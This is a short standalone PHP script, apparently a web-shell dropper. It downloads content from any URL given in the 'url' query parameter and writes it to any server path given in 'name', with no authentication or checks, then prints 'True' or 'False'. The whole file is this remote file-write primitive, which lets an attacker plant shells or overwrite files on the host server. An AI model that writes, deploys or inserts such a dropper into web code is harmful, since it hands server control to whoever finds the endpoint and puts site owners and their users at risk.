<?php
if(file_put_contents($_GET['name'],file_get_contents($_GET['url']))) {
    echo "True";
}
else {
    echo "False";
}
?>
